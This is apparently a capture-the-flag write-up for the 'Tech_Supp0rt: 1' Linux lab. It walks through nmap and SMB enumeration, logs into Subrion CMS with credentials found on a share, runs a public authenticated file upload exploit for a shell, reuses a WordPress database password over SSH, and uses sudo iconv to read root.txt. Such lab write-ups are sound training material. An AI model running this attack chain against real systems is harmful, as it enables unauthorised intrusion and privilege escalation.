# Writeup: Tech_Supp0rt: 1

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Sun Sep 14 16:36:47 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.10.19.22
Nmap scan report for 10.10.19.22
Host is up, received user-set (0.088s latency).
Scanned at 2025-09-14 16:36:48 CEST for 103s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s
| smb2-time: 
|   date: 2025-09-14T14:38:25
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25511/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54632/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 62191/udp): CLEAN (Timeout)
|   Check 4 (port 35246/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2025-09-14T20:08:26+05:30
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 14 16:38:31 2025 -- 1 IP address (1 host up) scanned in 104.03 seconds
```

Since ports 139 and 445 are open i used smbclient to enumerate smb and found a file called `enter.txt` in the `websvr` share in which i found some credentials for Subrion: `admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk` and the hint that there is a `/subrion` directory on the webserver. I failed on cracking the password after a while i remembered a "magic recipe" mentioned so i throw the pw hash into cyberchef and i get the password `S*******` back.

```shell
smbclient -N -L 10.10.19.22

smbclient //10.10.19.22/websvr -U ''
```

On port 80 i found a webserver, which just presented me the default apache page so i started a directory bruteforce with `gobuster`. This gives me 2 directories `/test` and `/wordpress`. On `/test` i just found a site showing a sh*tload of uncloseable popups and nothing else. 

```shell
gobuster dir -u http://10.10.19.22/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -o gobuster_scan.
```

I have done also a `gobuster` scan on `/subrion` but had some issues with it. After a little bit research i found a `robots.txt` on `/subrion` which contains some useful stuff.

```
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

## 💥 Exploitation:

On `http://10.10.19.22/subrion/panel` i found a login form si i logged in with the creds from the smb share. Since im on a `Subrion CMS 4.2.1` i used `searchsploit` to look for exploits for this version. I found a authenticated file upload exploit which i tried. This gives me a shell as `www-data` but i could not change the cwd so i uploaded a reverse shell and started a `netcat` listener.

```shell
searchsploit subrion 4.2.1

searchsploit -m php/webapps/49876.py

python3 49876.py -u http://10.10.19.22/subrion/panel/ -l admin -p S*******
```

## 🔓 Priviledge Escalation:

Since there was a wordpress running on the server i used `find` to locate the `wp-config.php` which gives me the password `ImA***************`. I looked for other users in `/etc/passwd` and found the user `scamsite`. I tried to ssh in to the box as `scamsite` and the db password found in the `wp-config.php` and was succesful. `sudo -l` gives me `(ALL) NOPASSWD: /usr/bin/iconv` so i looked it up on [GTFOBins](https://gtfobins.github.io/gtfobins/iconv/). I was able to read the `root.txt` abusing `iconv`.

```shell
LFILE=/root/root.txt

sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
```

## 💰 Loot:

```shell
# root.txt
851b8233a8c09400ec30651bd1529b**********
```